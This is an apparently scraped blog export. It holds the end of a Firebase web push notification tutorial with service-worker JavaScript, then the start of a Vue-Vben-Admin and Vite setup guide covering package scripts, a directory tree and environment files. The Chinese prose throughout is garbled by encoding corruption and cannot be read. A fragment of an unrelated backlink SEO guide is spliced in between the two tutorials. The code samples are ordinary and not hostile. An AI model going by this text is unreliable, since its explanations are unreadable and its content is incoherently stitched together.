\u0026#39;headers\u0026#39;: { \u0026#39;Authorization\u0026#39;: \u0026#39;key=å¾firebaseä¸Šå–å¾—ä¼ºæœå™¨é‡‘é‘°\u0026#39;, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, \u0026#39;body\u0026#39;: JSON.stringify({ \u0026#39;data\u0026#39;: notification, \u0026#39;to\u0026#39;: \u0026#39;ä½¿ç”¨è€…çš„token\u0026#39;, }) }).then(function(response) { console.log(response); }).catch(function(error) { alert(error); }); æ¥æ”¶ Web Push æ¥å— Web Push æœ‰ 2 ç¨®æƒ…æ³ï¼š\nä½¿ç”¨è€…æ­£é–‹å•Ÿå®˜ç¶²é é¢ ä½¿ç”¨è€…æ²’æœ‰é–‹å•Ÿå®˜ç¶²é é¢ ç¬¬ä¸€ç¨®æƒ…æ³ï¼Œæ˜¯åœ¨ index.js ä¸‹å¯«ä¸€å€‹ messaging.onMessage çš„ function è™•ç†ã€‚\nç¬¬äºŒç¨®æƒ…æ³ï¼Œæ˜¯åœ¨ sw.js ä¸‹å¯«ä¸€å€‹ messaging.setBackgroundMessageHandler çš„ function è™•ç†ã€‚\nä½¿ç”¨è€…æ­£é–‹å•Ÿå®˜ç¶²é é¢ å®˜ç¶²æ­£é–‹å•Ÿçš„ç‹€æ³ä¸‹ï¼Œå±¬æ–¼ JS çš„ notification åŠŸèƒ½ï¼Œfunction ç¯„ä¾‹å¦‚ä¸‹ï¼š\nfcm-web-push-notification.js 1 2 3 4 5 6 7 8 9 10 11 messaging.onMessage(function(payload) { var msgTitle = payload.data.title; var url = payload.data.click_action; var notification = new Notification(msgTitle, payload.data); // é»æ“Šæ¨æ’­å¾Œè¦é€£å»å“ª notification.addEventListener(\u0026#39;click\u0026#39;, function() { e.preventDefault(); location.href = url; }); }); payload å°±æ˜¯å‚³ä¾†çš„å€¼ï¼Œé»æ“Šå¾Œè¦å°åˆ°çš„é é¢å°±ç”¨ location.href ä¾†è™•ç†ã€‚\nä½¿ç”¨è€…æ²’æœ‰é–‹å•Ÿå®˜ç¶²é é¢ ä½¿ç”¨è€…åœ¨ä¸Šç¶²ï¼Œä½†æ²’æœ‰é–‹å•Ÿå®˜ç¶²çš„é é¢ï¼Œå°±æ˜¯ç”±ä¹‹å‰è¨»å†Šçš„ sw.js è™•ç†ï¼Œåœ¨ sw.js åŠ å…¥ä»¥ä¸‹ï¼š\nfcm-web-push-sw2.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 var click_action; // ç›£è½notifictioné»æ“Šäº‹ä»¶ self.addEventListener(\u0026#39;notificationclick\u0026#39;, function(event) { var url = click_action; event.notification.close(); event.waitUntil( clients.matchAll({ type: \u0026#39;window\u0026#39; }).then(windowClients =\u0026gt; { // å¦‚æœtabæ˜¯é–‹è‘—çš„ï¼Œå°± focus é€™å€‹tab for (var i = 0; i \u0026lt; windowClients.length; i++) { var client = windowClients[i]; if(client.url === url \u0026amp;\u0026amp; \u0026#39;focus\u0026#39; in client) { return client.focus(); } } // å¦‚æœæ²’æœ‰ï¼Œå°±æ–°å¢tab if(clients.openWindow) { return clients.openWindow(click_action); } }) ); }); // FCM messaging.setBackgroundMessageHandler(function(payload) { var data = payload.data; var title = data.title; var options = { body: data.body, icon: \u0026#39;/logo/logo192.png\u0026#39;, badge: \u0026#39;/logo/logo192.png\u0026#39; }; click_action = data.click_action; return self.registration.showNotification(title, options); }); click_action æ˜¯é»æ“Šå¾Œè¦é–‹å•Ÿçš„é é¢ç¶²å€ï¼Œä½†è¦å¦å¤–å¯«ä¸€å€‹ notificationclick ä¾†è™•ç†ã€‚\né€™é‚Šè¸©äº†ä¸€å€‹å‘ï¼Œå¦‚æœæŒ‰ç…§ä¸€èˆ¬é †åºä¾†å¯«ï¼Œæœƒå…ˆå¯«äº† messaging.setBackgroundMessageHandler å¾Œï¼Œå†å¯« notificationclickã€‚ç„¶å¾Œå°±æœƒç™¼ç¾ï¼ŒChrome ä¸Šå¯ä»¥æ­£å¸¸é‹ä½œï¼Œä½†åœ¨ Firefox ä¸Šæ€éº¼é»å°±æ˜¯ä¸æœƒé–‹å•Ÿé é¢ã€‚\nGoogle äº†å¾ˆä¹…ï¼Œæ‰çœ‹åˆ°é€™ç¯‡ï¼šservice worker notificationclick event doesnâ€™t focus or open my website in tab\nclick_action æ˜¯ Chrome ç”¨çš„ï¼Œå¦‚æœ messaging.setBackgroundMessageHandler å…ˆå¯«äº†ï¼Œé‚£ FCM å°±æœƒå…¨éƒ¨æ¥æ”¶ Web Push çš„åŠŸèƒ½ï¼Œå°±ä¸æœƒè®“åŸç”Ÿçš„ notificationclick äº‹ä»¶è¢«é‹ä½œï¼Œå› æ­¤ notificationclick å¾—å¯«åœ¨å‰ï¼Œè®“åŸç”Ÿäº‹ä»¶é‹ä½œå¾Œï¼Œå†åŸ·è¡Œ FCM çš„äº‹ä»¶ã€‚\nè£œå……è³‡æº æœ‰äº†ç™¼é€ã€æ¥æ”¶ï¼ŒåŸºæœ¬ä¸Š Web Push å°±å¯ä»¥é †åˆ©é‹ä½œäº†ã€‚\nè¦æ³¨æ„çš„æ˜¯ Web Push åªæ¥å—åœ¨ https ä»¥ä¸‹é‹è¡Œã€‚\næœ€å¾Œé™„ä¸Šå­¸ç¿’æ™‚åƒè€ƒçš„æ•™å­¸æ–‡ï¼Œä»¥åŠæœ¬ç¯‡çš„ GitHub åŸå§‹ç¢¼ã€‚\nå¾å»º Firebase å°±é–‹å§‹æ•™å­¸çš„ï¼ˆè‹±æ–‡ï¼‰ï¼šTutorial: Web Push notification using Firebase\nå»ºç«‹ Service Worker Web Push Notification â€” (Firebase Push Notificationå¯¦ä½œç´€éŒ„)\nPush Notificationä¹‹æˆç‚ºè¨‚é–±ç”¨æˆ¶(Firebaseå¯¦ä½œ)\nGoogle å®˜æ–¹æ•™å­¸çš„åŸå§‹ç¢¼ï¼šGitHub\nGoogle å®˜æ–¹æ•™å­¸çš„åŠŸèƒ½ç¤ºç¯„ï¼šNotification Examples\n","date":"2022-10-19T00:00:00Z","image":"https://live.staticflickr.com/65535/52438994804_33f71b7e35_o.jpg","permalink":"https://wayneblog.ga/2022-10-19/web-pwa/","title":"å°‡ç¶²é è®ŠæˆProgressive Web Application(PWA)ï¼Œæ¼¸é€²å¼çš„ç¶²é æ‡‰ç”¨ç¨‹å¼"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\né€™æ˜¯ä¸€ç¯‡å®Œæ•´çš„ 2022 å¹´é€£çµå„ªåŒ–æŒ‡å—ã€‚\nå› æ­¤ï¼Œå¦‚æœä½ æƒ³è¦å–å¾—æ¬Šå¨ç¶²ç«™çš„åå‘é€£çµã€‚\nä½ å°‡æœƒåœ¨é€™ç¯‡æ–°æŒ‡å—ä¸­ï¼Œäº«å—æœ¬æ–‡å¯æ“ä½œçš„æŠ€å·§ã€‚\nè®“æˆ‘å€‘å¾€æ·±å…¥å…¶ä¸­å§ã€‚\nVben Admin é»æˆ‘è·³é Vben Adminï¼Œç›´æ¥å‰å¾€é…ç½®Vite\nä»‹ç´¹ Vue-Vben-Admin æ˜¯ä¸€å€‹åŸºæ–¼ Vue3.0ã€Viteã€Ant-Design-Vueã€TypeScript çš„å¾Œå°è§£æ±ºæ–¹æ¡ˆï¼Œç›®æ¨™æ˜¯ç‚ºé–‹ç™¼ä¸­å¤§å‹é …ç›®æä¾›é–‹ç®±å³ç”¨çš„è§£æ±ºæ–¹æ¡ˆã€‚åŒ…æ‹¬äºŒæ¬¡å°è£çµ„ä»¶ã€utilsã€hooksã€å‹•æ…‹èœå–®ã€æ¬Šé™æ ¡é©—ã€æŒ‰éˆ•ç´šåˆ¥æ¬Šé™æ§åˆ¶ç­‰åŠŸèƒ½ã€‚é …ç›®æœƒä½¿ç”¨å‰ç«¯è¼ƒæ–°çš„æŠ€è¡“æ£§ï¼Œå¯ä»¥ä½œç‚ºé …ç›®çš„å•Ÿå‹•æ¨¡ç‰ˆï¼Œä»¥å¹«åŠ©ä½ å¿«é€Ÿæ­å»ºä¼æ¥­ç´šä¸­å¾Œå°ç”¢å“åŸå‹ã€‚ä¹Ÿå¯ä»¥ä½œç‚ºä¸€å€‹ç¤ºä¾‹ï¼Œç”¨æ–¼å­¸ç¿’ vue3ã€viteã€ts ç­‰ä¸»æµæŠ€è¡“ã€‚è©²é …ç›®æœƒæŒçºŒè·Ÿé€²æœ€æ–°æŠ€è¡“ï¼Œä¸¦å°‡å…¶æ‡‰ç”¨åœ¨é …ç›®ä¸­ã€‚\næ–‡æª” ä¸­æ–‡æ–‡æª”åœ°å€ç‚º vben-admin-docï¼Œæ¡ç”¨ Vitepress é–‹ç™¼ã€‚ æœ¬åœ°é‹è¡Œæ–‡æª” å¦‚éœ€æœ¬åœ°é‹è¡Œæ–‡æª”ï¼Œè«‹æ‹‰å–ä»£ç¢¼åˆ°æœ¬åœ°ã€‚\n1 2 3 4 5 6 7 8 # æ‹‰å–ä»£ç¢¼ git clone https://github.com/vbenjs/vue-vben-admin-doc # å®‰è£ä¾è³´ yarn # é‹è¡Œé …ç›® yarn dev éœ€è¦æŒæ¡çš„åŸºç¤çŸ¥è­˜ æœ¬é …ç›®éœ€è¦ä¸€å®šå‰ç«¯åŸºç¤çŸ¥è­˜ï¼Œè«‹ç¢ºä¿æŒæ¡Vue çš„åŸºç¤çŸ¥è­˜ï¼Œä»¥ä¾¿èƒ½è™•ç†ä¸€äº›å¸¸è¦‹çš„å•é¡Œã€‚å»ºè­°åœ¨é–‹ç™¼å‰å…ˆå­¸ä¸€ä¸‹ä»¥ä¸‹å…§å®¹ï¼Œæå‰äº†è§£å’Œå­¸ç¿’é€™äº›çŸ¥è­˜ï¼Œæœƒå°é …ç›®ç†è§£éå¸¸æœ‰å¹«åŠ©ï¼š\nVue3 æ–‡æª” Vue-RFCS Vue2 é·ç§»åˆ° 3 TypeScript Vue-router Ant-Design-Vue ES6 Vitejs WindiCss æ¨¡ç‰ˆ vue-vben-admin (å®Œæ•´ç‰ˆæ¼”ç¤º) vue-vben-admin å®Œæ•´ç‰ˆæœ¬ã€‚è©²ç‰ˆæœ¬ä¸»è¦æ˜¯æä¾›ä¸€äº›Demoç¤ºä¾‹åŠæ’ä»¶çš„ä½¿ç”¨é›†æˆæ–¹å¼ï¼Œä¸»è¦ç”¨æ–¼åƒè€ƒã€‚å¦‚æœå°é …ç›®ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œä¸å»ºè­°åœ¨æ­¤åŸºç¤ä¸Šé€²è¡Œé–‹ç™¼ï¼Œè«‹ä½¿ç”¨ä¸‹æ–¹æä¾›çš„ç²¾ç°¡ç‰ˆæœ¬ã€‚\nvue-vben-admin-thin (ç²¾ç°¡ç‰ˆæ¼”ç¤º) vue-vben-admin ç²¾ç°¡ç‰ˆæœ¬ã€‚åˆªé™¤äº†ç›¸é—œç¤ºä¾‹ã€ç„¡ç”¨æ–‡ä»¶åŠåŠŸèƒ½ã€ä¾è³´ã€‚å¯ä»¥æ ¹æ“šè‡ªèº«éœ€æ±‚å®‰è£å°æ‡‰çš„ä¾è³´ã€‚å› ç‚ºä½¿ç”¨çš„æ˜¯ viteï¼Œä¾è³´åˆªé™¤ä¸æœƒå°è‡´ç›¸é—œçµ„ä»¶æˆ–è€… hook ç™¼å‡ºè­¦å‘Šã€‚åªåœ¨éœ€è¦çš„æ™‚å€™å®‰è£å°æ‡‰çš„åº«å³å¯ã€‚\nvite æ’ä»¶æ¨è–¦ vite-plugin-mock - ç”¨æ–¼æœ¬åœ°åŠé–‹ç™¼ç’°å¢ƒæ•¸æ“š mock\nvite-plugin-html - ç”¨æ–¼ html æ¨¡ç‰ˆè½‰æ›ï¼Œå¯ä»¥åœ¨htmlæ–‡ä»¶å…§é€²è¡Œæ›¸å¯«æ¨¡ç‰ˆèªæ³•\nvite-plugin-style-import - ç”¨æ–¼çµ„ä»¶åº«æ¨£å¼æŒ‰éœ€å¼•å…¥\nvite-plugin-imagemin - ç”¨æ–¼æ‰“åŒ…å£“ç¸®åœ–ç‰‡è³‡æº\nvite-plugin-theme - ç”¨æ–¼åœ¨ç·šåˆ‡æ›ä¸»é¡Œè‰²/é»‘æš—ä¸»é¡Œé©é…ç­‰ä¸»é¡Œç›¸é—œé…ç½®\nvite-plugin-compression - ç”¨æ–¼æ‰“åŒ…è¼¸å‡º.gz|.bræ–‡ä»¶\nvite-plugin-svg-icons - å¿«é€Ÿç”Ÿæˆ svg sprite\nç€è¦½å™¨æ”¯æŒ æœ¬åœ°é–‹ç™¼æ¨è–¦ä½¿ç”¨Chrome æœ€æ–°ç‰ˆç€è¦½å™¨ï¼Œä¸æ”¯æŒChrome 80ä»¥ä¸‹ç‰ˆæœ¬ã€‚\nç”Ÿç”¢ç’°å¢ƒæ”¯æŒç¾ä»£ç€è¦½å™¨ï¼Œä¸æ”¯æŒIEã€‚\nå‰µå»ºVbenLearné …ç›® ä½¿ç”¨Viteå‰µå»ºé …ç›® viteå®˜æ–¹æ–‡æª”\n1 2 3 4 5 6 7 8 # å®˜ç¶²ä¸Šçš„å‰µå»ºé …ç›®å‘½ä»¤ yarn create @vitejs/app # åç¨± vben-learn # vue-tsçš„æ¨¡æ¿ âˆš vue-ts yarnå ±éŒ¯ æ–‡ä»¶åã€ç›®éŒ„åæˆ–å·æ¨™èªæ³•ä¸æ­£ç¢ºã€‚å ±éŒ¯ï¼Œåƒè€ƒéˆæ¥\nå®‰è£ vscode æ’ä»¶ å®‰è£æ’ä»¶ VbenAdmin å®˜æ–¹æ¨è\nIconify IntelliSenseï¼šIconify åœ–æ¨™æ’ä»¶ WndiCSS lntelliSenseï¼šwindicss æç¤ºæ’ä»¶ i18n Allyï¼š i18n æ’ä»¶ Veturï¼švue é–‹ç™¼å¿…å‚™ ï¼ˆä¹Ÿå¯ä»¥é¸æ“‡ Volarï¼‰ ESLintï¼šè…³æœ¬ä»£ç¢¼æª¢æŸ¥ Prettier - Code formatterï¼šä»£ç¢¼æ ¼å¼åŒ– Stylelintï¼šcss æ ¼å¼åŒ– DotENVï¼š .env æ–‡ä»¶ é«˜äº® ç²å– Vben Admin å¾ GitHub ç²å–ä»£ç¢¼ 1 git clone https://github.com/vbenjs/vue-vben-admin.git å¾ Gitee ç²å–ä»£ç¢¼ 1 git clone https://gitee.com/annsion/vue-vben-admin.git æ³¨æ„\nGitee çš„ä»£ç¢¼å¯èƒ½ä¸æ˜¯æœ€æ–°çš„\nimagemin ä¾è³´å®‰è£å¤±æ•—è§£æ±ºæ–¹æ³• ç”±æ–¼ imagemin åœ¨åœ‹å…§å®‰è£å›°é›£ï¼Œæä¾›ä»¥ä¸‹å¹¾å€‹è§£æ±ºæ–¹æ¡ˆï¼š\nä½¿ç”¨ yarn åœ¨ package.json å…§é…ç½®(æ¨è–¦ï¼Œé …ç›®å…§å·²é›†æˆï¼Œå‰ææ˜¯å¿…é ˆä½¿ç”¨ yarn) package.json 1 2 3 4 5 // ... \u0026#34;resolutions\u0026#34;: { \u0026#34;bin-wrapper\u0026#34;: \u0026#34;npm:bin-wrapper-china\u0026#34; } // ... ä½¿ç”¨ npmï¼Œåœ¨é›»è…¦ host æ–‡ä»¶åŠ ä¸Šå¦‚ä¸‹é…ç½®å³å¯ etc/hosts 1 199.232.4.133 raw.githubusercontent.com npm script package.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 // ... \u0026#34;scripts\u0026#34;: { # å®‰è£ä¾è³´ \u0026#34;bootstrap\u0026#34;: \u0026#34;yarn install\u0026#34;, # é‹è¡Œé …ç›® \u0026#34;serve\u0026#34;: \u0026#34;npm run dev\u0026#34;, # é‹è¡Œé …ç›® \u0026#34;dev\u0026#34;: \u0026#34;vite\u0026#34;, # æ§‹å»ºé …ç›® \u0026#34;build\u0026#34;: \u0026#34;vite build \u0026amp;\u0026amp; esno ./build/script/postBuild.ts\u0026#34;, # æ¸…ç©ºç·©å­˜å¾Œæ§‹å»ºé …ç›® \u0026#34;build:no-cache\u0026#34;: \u0026#34;yarn clean:cache \u0026amp;\u0026amp; npm run build\u0026#34;, # ç”Ÿæˆæ‰“åŒ…åˆ†æï¼Œåœ¨ `Mac OS` é›»è…¦ä¸ŠåŸ·è¡Œå®Œæˆå¾Œæœƒè‡ªå‹•æ‰“é–‹ç•Œé¢ï¼Œåœ¨ `Window` é›»è…¦ä¸ŠåŸ·è¡Œå®Œæˆå¾Œéœ€è¦æ‰“é–‹ `./build/.cache/stats.html` æŸ¥çœ‹ \u0026#34;report\u0026#34;: \u0026#34;cross-env REPORT=true npm run build\u0026#34;, # é¡å‹æª¢æŸ¥ \u0026#34;type:check\u0026#34;: \u0026#34;vue-tsc --noEmit --skipLibCheck\u0026#34;, # é è¦½æ‰“åŒ…å¾Œçš„å…§å®¹ï¼ˆå…ˆæ‰“åŒ…åœ¨é€²è¡Œé è¦½ï¼‰ \u0026#34;preview\u0026#34;: \u0026#34;npm run build \u0026amp;\u0026amp; vite preview\u0026#34;, # ç›´æ¥é è¦½æœ¬åœ° dist æ–‡ä»¶ç›®éŒ„ \u0026#34;preview:dist\u0026#34;: \u0026#34;vite preview\u0026#34;, # ç”Ÿæˆ ChangeLog \u0026#34;log\u0026#34;: \u0026#34;conventional-changelog -p angular -i CHANGELOG.md -s\u0026#34;, # åˆªé™¤ç·©å­˜ \u0026#34;clean:cache\u0026#34;: \u0026#34;rimraf node_modules/.cache/ \u0026amp;\u0026amp; rimraf node_modules/.vite\u0026#34;, # åˆªé™¤ node_modules (`window` ç³»çµ±æ‰‹å‹•åˆªé™¤è©²ç›®éŒ„è¼ƒæ…¢ï¼Œå¯ä»¥ä½¿ç”¨è©²å‘½ä»¤ä¾†é€²è¡Œåˆªé™¤) \u0026#34;clean:lib\u0026#34;: \u0026#34;rimraf node_modules\u0026#34;, # åŸ·è¡Œ eslint æ ¡é©—ï¼Œä¸¦ä¿®å¾©éƒ¨åˆ†å•é¡Œ \u0026#34;lint:eslint\u0026#34;: \u0026#34;eslint \\\u0026#34;{src,mock}/**/*.{vue,ts,tsx}\\\u0026#34; --fix\u0026#34;, # åŸ·è¡Œ prettier æ ¼å¼åŒ–ï¼ˆè©²å‘½ä»¤æœƒå°é …ç›®æ‰€æœ‰ä»£ç¢¼é€²è¡Œ prettier æ ¼å¼åŒ–ï¼Œè«‹è¬¹æ…åŸ·è¡Œï¼‰ \u0026#34;lint:prettier\u0026#34;: \u0026#34;prettier --write --loglevel warn \\\u0026#34;src/**/*.{js,json,tsx,css,less,scss,vue,html,md}\\\u0026#34;\u0026#34;, # åŸ·è¡Œ stylelint æ ¼å¼åŒ– \u0026#34;lint:stylelint\u0026#34;: \u0026#34;stylelint --fix \\\u0026#34;**/*.{vue,less,postcss,css,scss}\\\u0026#34; --cache --cache-location node_modules/.cache/stylelint/\u0026#34;, \u0026#34;lint:lint-staged\u0026#34;: \u0026#34;lint-staged -c ./.husky/lintstagedrc.js\u0026#34;, \u0026#34;lint:pretty\u0026#34;: \u0026#34;pretty-quick --staged\u0026#34;, # å°æ‰“åŒ…çµæœé€²è¡Œ gzip æ¸¬è©¦ \u0026#34;test:gzip\u0026#34;: \u0026#34;http-server dist --cors --gzip -c-1\u0026#34;, # å°æ‰“åŒ…ç›®éŒ„é€²è¡Œ brotli æ¸¬è©¦ \u0026#34;test:br\u0026#34;: \u0026#34;http-server dist --cors --brotli -c-1\u0026#34;, # é‡æ–°å®‰è£ä¾è³´ï¼Œè¦‹ä¸‹æ–¹èªªæ˜ \u0026#34;reinstall\u0026#34;: \u0026#34;rimraf yarn.lock \u0026amp;\u0026amp; rimraf package.lock.json \u0026amp;\u0026amp; rimraf node_modules \u0026amp;\u0026amp; npm run bootstrap\u0026#34;, \u0026#34;install:husky\u0026#34;: \u0026#34;is-ci || husky install\u0026#34;, # ç”Ÿæˆåœ–æ¨™é›†ï¼Œè¦‹ä¸‹æ–¹èªªæ˜ \u0026#34;gen:icon\u0026#34;: \u0026#34;esno ./build/generate/icon/index.ts\u0026#34;, \u0026#34;postinstall\u0026#34;: \u0026#34;npm run install:husky\u0026#34; }, // ... ç›®éŒ„èªªæ˜ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 . â”œâ”€â”€ build # æ‰“åŒ…è…³æœ¬ç›¸é—œ â”‚ â”œâ”€â”€ config # é…ç½®æ–‡ä»¶ â”‚ â”œâ”€â”€ generate # ç”Ÿæˆå™¨ â”‚ â”œâ”€â”€ script # è…³æœ¬ â”‚ â””â”€â”€ vite # viteé…ç½® â”œâ”€â”€ mock # mockæ–‡ä»¶å¤¾ â”œâ”€â”€ public # å…¬å…±éœæ…‹è³‡æºç›®éŒ„ â”œâ”€â”€ src # ä¸»ç›®éŒ„ â”‚ â”œâ”€â”€ api # æ¥å£æ–‡ä»¶ â”‚ â”œâ”€â”€ assets # è³‡æºæ–‡ä»¶ â”‚ â”‚ â”œâ”€â”€ icons # icon sprite åœ–æ¨™æ–‡ä»¶å¤¾ â”‚ â”‚ â”œâ”€â”€ images # é …ç›®å­˜æ”¾åœ–ç‰‡çš„æ–‡ä»¶å¤¾ â”‚ â”‚ â””â”€â”€ svg # é …ç›®å­˜æ”¾svgåœ–ç‰‡çš„æ–‡ä»¶å¤¾ â”‚ â”œâ”€â”€ components # å…¬å…±çµ„ä»¶ â”‚ â”œâ”€â”€ design # æ¨£å¼æ–‡ä»¶ â”‚ â”œâ”€â”€ directives # æŒ‡ä»¤ â”‚ â”œâ”€â”€ enums # æšèˆ‰/å¸¸é‡ â”‚ â”œâ”€â”€ hooks # hook â”‚ â”‚ â”œâ”€â”€ component # çµ„ä»¶ç›¸é—œhook â”‚ â”‚ â”œâ”€â”€ core # åŸºç¤hook â”‚ â”‚ â”œâ”€â”€ event # äº‹ä»¶ç›¸é—œhook â”‚ â”‚ â”œâ”€â”€ setting # é…ç½®ç›¸é—œhook â”‚ â”‚ â””â”€â”€ web # webç›¸é—œhook â”‚ â”œâ”€â”€ layouts # ä½ˆå±€æ–‡ä»¶ â”‚ â”‚ â”œâ”€â”€ default # é»˜èªä½ˆå±€ â”‚ â”‚ â”œâ”€â”€ iframe # iframeä½ˆå±€ â”‚ â”‚ â””â”€â”€ page # é é¢ä½ˆå±€ â”‚ â”œâ”€â”€ locales # å¤šèªè¨€ â”‚ â”œâ”€â”€ logics # é‚è¼¯ â”‚ â”œâ”€â”€ main.ts # ä¸»å…¥å£ â”‚ â”œâ”€â”€ router # è·¯ç”±é…ç½® â”‚ â”œâ”€â”€ settings # é …ç›®é…ç½® â”‚ â”‚ â”œâ”€â”€ componentSetting.ts # çµ„ä»¶é…ç½® â”‚ â”‚ â”œâ”€â”€ designSetting.ts # æ¨£å¼é…ç½® â”‚ â”‚ â”œâ”€â”€ encryptionSetting.ts # åŠ å¯†é…ç½® â”‚ â”‚ â”œâ”€â”€ localeSetting.ts # å¤šèªè¨€é…ç½® â”‚ â”‚ â”œâ”€â”€ projectSetting.ts # é …ç›®é…ç½® â”‚ â”‚ â””â”€â”€ siteSetting.ts # ç«™é»é…ç½® â”‚ â”œâ”€â”€ store # æ•¸æ“šå€‰åº« â”‚ â”œâ”€â”€ utils # å·¥å…·é¡ â”‚ â””â”€â”€ views # é é¢ â”œâ”€â”€ test # æ¸¬è©¦ â”‚ â””â”€â”€ server # æ¸¬è©¦ç”¨åˆ°çš„æœå‹™ â”‚ â”œâ”€â”€ api # æ¸¬è©¦æœå‹™å™¨ â”‚ â”œâ”€â”€ upload # æ¸¬è©¦ä¸Šå‚³æœå‹™å™¨ â”‚ â””â”€â”€ websocket # æ¸¬è©¦wsæœå‹™å™¨ â”œâ”€â”€ types # é¡å‹æ–‡ä»¶ â”œâ”€â”€ vite.config.ts # viteé…ç½®æ–‡ä»¶ â””â”€â”€ windi.config.ts # windcssé…ç½®æ–‡ä»¶ Viteé…ç½®å¤šç’°å¢ƒ èªªæ˜ï¼š å°±å¥½åƒä¹‹å‰åœ¨Vue-Cliä¸­çš„envä¸€æ¨£ã€‚\nViteå®˜ç¶²èªªæ˜\nVbenAdminå®˜æ–¹èªªæ˜\né …ç›®çš„ç’°å¢ƒè®Šé‡é…ç½®ä½æ–¼é …ç›®æ ¹ç›®éŒ„ä¸‹çš„ .envã€.env.developmentã€.env.production\n1 2 3 4 .env # åœ¨æ‰€æœ‰çš„ç’°å¢ƒä¸­è¢«è¼‰å…¥ .env.local # åœ¨æ‰€æœ‰çš„ç’°å¢ƒä¸­è¢«è¼‰å…¥ï¼Œä½†æœƒè¢« git å¿½ç•¥ .env.[mode] # åªåœ¨æŒ‡å®šçš„æ¨¡å¼ä¸­è¢«è¼‰å…¥ .env.[mode].local # åªåœ¨æŒ‡å®šçš„æ¨¡å¼ä¸­è¢«è¼‰å…¥ï¼Œä½†æœƒè¢« git å¿½ç•¥ å‰µå»ºé»˜èªé…ç½®æ–‡ä»¶ æ ¹ç›®éŒ„ä¸‹å‰µå»ºï¼š.envæ–‡ä»¶ 1 2 3 4 5 6 7 8 # é‹è¡Œçš„ç«¯å£ VITE_PORT = 3100 # æ‡‰ç”¨åç¨± VITE_GLOB_APP_TITLE = Vben Admin # æ‡‰ç”¨çŸ­åç¨± VITE_GLOB_APP_SHORT_NAME = vue_vben_admin å‰µå»ºç”Ÿç”¢é…ç½®æ–‡ä»¶ æ ¹ç›®éŒ„ä¸‹å‰µå»ºï¼š.env.productionæ–‡ä»¶ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 # æ˜¯å¦ä½¿ç”¨mock VITE_USE_MOCK = true # å…¬å…±è·¯å¾‘ VITE_PUBLIC_PATH = / # æ˜¯å¦åˆªé™¤æ‰€æœ‰æ—¥èªŒæ‰“å° VITE_DROP_CONSOLE = true # æ˜¯å¦å•Ÿç”¨gzipæˆ–brotliå£“ç¸®ã€‚ # å¯é¸ï¼šgzip | brotli | none # å¦‚æœä½ éœ€è¦å¤šå€‹è¡¨æ ¼ï¼Œä½ å¯ä»¥ä½¿ç”¨`,`ä¾†åˆ†éš”ã€‚ VITE_BUILD_COMPRESS = \u0026#39;none\u0026#39; # æ‡‰ç”¨åŸºæœ¬æ¥å£åœ°å€ VITE_GLOB_API_URL=/api # æ–‡ä»¶ä¸Šå‚³åœ°å€ï¼Œå¯é¸ # å¯ä»¥é€šénginxè½‰ç™¼æˆ–ç›´æ¥å¯«å…¥å¯¦éš›åœ°å€ã€‚ VITE_GLOB_UPLOAD_URL=/upload # æ¥å£å‰ç¶´ VITE_GLOB_API_URL_PREFIX= # æ˜¯å¦å•Ÿç”¨åœ–åƒå£“ç¸® VITE_USE_IMAGEMIN= true #ä½¿ç”¨PWA VITE_USE_PWA = false # æ˜¯å¦èˆ‡èˆŠç‰ˆç€è¦½å™¨å…¼å®¹ VITE_LEGACY = false å‰µå»ºé–‹ç™¼é…ç½®æ–‡ä»¶ æ ¹ç›®éŒ„ä¸‹å‰µå»ºï¼š.env.developmentæ–‡ä»¶ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 VITE_PORT = 3100 # æ˜¯å¦ä½¿ç”¨mock VITE_USE_MOCK = true # å…¬å…±è·¯å¾‘ VITE_PUBLIC_PATH = / # è·¨åŸŸä»£ç†ï¼Œä½ å¯ä»¥é…ç½®å¤šå€‹ä»£ç†ã€‚ VITE_PROXY=[[\u0026#34;/api\u0026#34;,\u0026#34;http://localhost:3000\u0026#34;],[\u0026#34;/upload\u0026#34;,\u0026#34;http://localhost:3001/upload\u0026#34;]] # VITE_PROXY=[[\u0026#34;/api\u0026#34;,\u0026#34;https://vvbin.cn/test\u0026#34;]] # æ˜¯å¦åˆªé™¤æ‰€æœ‰æ—¥èªŒæ‰“å° VITE_DROP_CONSOLE = false # æ‡‰ç”¨åŸºæœ¬æ¥å£åœ°å€ VITE_GLOB_API_URL=/api # æ–‡ä»¶ä¸Šå‚³åœ°å€ï¼Œå¯é¸ VITE_GLOB_UPLOAD_URL=/upload # æ¥å£å‰ç¶´ VITE_GLOB_API_URL_PREFIX= æ¸¬è©¦é…ç½® src\\App.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt;{{ vitePort }}\u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import { defineComponent, ref } from \u0026#34;vue\u0026#34;; export default defineComponent({ name: \u0026#34;App\u0026#34;, setup() { const vitePort = ref(import.meta.env.VITE_PORT); return { vitePort, }; }, }); \u0026lt;/script\u0026gt; ç”Ÿç”¢ç’°å¢ƒå‹•æ…‹é…ç½®ï¼Œå¯åƒè€ƒ Vben Admin å®˜æ–¹èªªæ˜\né…ç½®TS èªªæ˜ æˆ‘å€‘ä½¿ç”¨Viteå‰µå»ºçš„é …ç›®æ™‚ä½¿ç”¨çš„æ˜¯vue-tsæ¨¡æ¿ï¼Œæ‰€ä»¥åœ¨å‰µå»ºé 